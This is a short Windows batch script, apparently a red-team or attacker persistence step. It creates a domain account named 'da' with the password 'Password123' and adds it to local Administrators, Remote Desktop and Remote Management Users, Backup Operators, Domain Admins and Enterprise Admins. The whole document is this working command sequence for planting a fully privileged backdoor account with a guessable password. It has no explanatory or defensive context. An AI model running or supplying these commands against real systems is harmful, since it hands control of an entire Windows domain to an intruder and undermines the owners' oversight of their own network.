
set newuser="da"
set newpass="Password123"

net user %newuser% %newpass% /add /domain
net localgroup "Users" %newuser% /add
net localgroup "Administrators" %newuser% /add
net localgroup "Remote Desktop Users" %newuser% /add
net localgroup "Remote Management Users" %newuser% /add
net localgroup "Backup Operators" %newuser% /add
net group "Domain Users" %newuser% /domain /add
net group "Domain Admins" %newuser% /domain /add
net group "Enterprise Admins" %newuser% /domain /add
net user %newuser%
net user %newuser% /domain

